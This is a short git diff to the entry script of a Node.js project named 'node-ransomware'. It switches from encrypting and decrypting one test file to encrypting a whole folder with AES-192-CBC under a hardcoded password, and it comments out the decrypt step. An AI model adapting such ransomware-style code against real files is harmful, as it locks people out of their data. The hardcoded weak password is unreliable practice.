@@ -1,8 +1,8 @@
 require('dotenv').config();
-const { encode, decode } = require('./app');
+const { encodeFolder, decodeFolder } = require('./app');
 const logger = require('./utils/logger');
 
-const FOLDER = 'test.txt';
+const FOLDER = '/Users/edson.perez/Desktop/node-ransomware/toEncode';
 const ALGORITHM = 'aes-192-cbc';
 const PASSWORD = 'qweqwe';
 
@@ -10,11 +10,9 @@ logger.info(
   `Starting in ${process.env.NODE_ENV} mode and logger ${process.env.LOGGER_LEVEL} mode`
 );
 
-const init = async () => {
-  await encode(FOLDER, ALGORITHM, PASSWORD);
-  logger.info(`Encode done `);
-  await decode(FOLDER, ALGORITHM, PASSWORD);
-  logger.info(`Decode done`);
-};
-
-init();
+try {
+  encodeFolder(FOLDER, ALGORITHM, PASSWORD);
+  // decodeFolder(FOLDER, ALGORITHM, PASSWORD);
+} catch (error) {
+  logger.error(error);
+}
